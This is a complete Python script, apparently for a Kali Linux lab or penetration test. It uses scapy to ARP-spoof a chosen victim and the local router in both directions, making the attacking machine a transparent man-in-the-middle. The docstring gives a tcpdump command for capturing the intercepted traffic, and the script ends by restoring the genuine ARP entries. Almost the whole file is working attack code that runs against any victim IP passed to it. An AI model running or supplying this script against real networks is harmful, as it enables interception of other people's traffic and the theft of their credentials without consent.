#!/usr/bin/env python3
"""Bidirectional ARP-spoof MITM test with clean restore — run on Kali/root Linux.

Usage (as root):  python3 arp_mitm_test.py <VICTIM_IP> [POISON_SECS]

Poisons the victim into believing Kali is the router AND the router into
believing the victim is Kali. With ip_forward=1 the victim's internet traffic
flows through Kali (transparent MITM) — capture it in parallel with:
    tcpdump -i eth0 -nn -e -s0 -w /tmp/mitm.pcap host <VICTIM_IP>
Then verify: router-forwarded packets to Kali's MAC in the pcap = MITM proof.
Restore re-asserts real MACs both directions; verify post-restore with a
short capture (expect ZERO packets dst = Kali MAC).
"""
import sys, time
from scapy.all import sendp, Ether, ARP, srp1, conf

IFACE = "eth0"
ROUTER_IP = "192.168.29.1"
KALI_MAC = open(f"/sys/class/net/{IFACE}/address").read().strip()

def router_mac():
    ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ROUTER_IP), iface=IFACE, timeout=3, verbose=0)
    return ans[ARP].hwsrc if ans else sys.exit("router MAC unresolved")

def victim_mac(ip):
    ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), iface=IFACE, timeout=3, verbose=0)
    return ans[ARP].hwsrc if ans else sys.exit(f"victim {ip} OFFLINE")

def poison(vm, rm, secs):
    end = time.time() + secs
    while time.time() < end:
        sendp(Ether(dst=vm, src=KALI_MAC)/ARP(op=2, psrc=ROUTER_IP, pdst=VICTIM_IP,
                   hwsrc=KALI_MAC, hwdst=vm), iface=IFACE, verbose=0)
        sendp(Ether(dst=rm, src=KALI_MAC)/ARP(op=2, psrc=VICTIM_IP, pdst=ROUTER_IP,
                   hwsrc=KALI_MAC, hwdst=rm), iface=IFACE, verbose=0)
        time.sleep(1.5)

def restore(vm, rm):
    for _ in range(5):
        sendp(Ether(dst=vm, src=rm)/ARP(op=2, psrc=ROUTER_IP, pdst=VICTIM_IP,
               hwsrc=rm, hwdst=vm), iface=IFACE, verbose=0)
        sendp(Ether(dst=rm, src=vm)/ARP(op=2, psrc=VICTIM_IP, pdst=ROUTER_IP,
               hwsrc=vm, hwdst=rm), iface=IFACE, verbose=0)
        time.sleep(1)

VICTIM_IP = sys.argv[1] if len(sys.argv) > 1 else "192.168.29.141"
SECS = int(sys.argv[2]) if len(sys.argv) > 2 else 60
RM = router_mac(); VM = victim_mac(VICTIM_IP)
print(f"router {ROUTER_IP} = {RM} | victim {VICTIM_IP} = {VM} | kali {IFACE} = {KALI_MAC}")
print(f"poisoning {SECS}s (bidirectional)...")
poison(VM, RM, SECS)
print("restoring ARP (real MACs)...")
restore(VM, RM)
print("DONE — verify: ip neigh clean + post-restore capture shows no dst=KALI_MAC pkts")
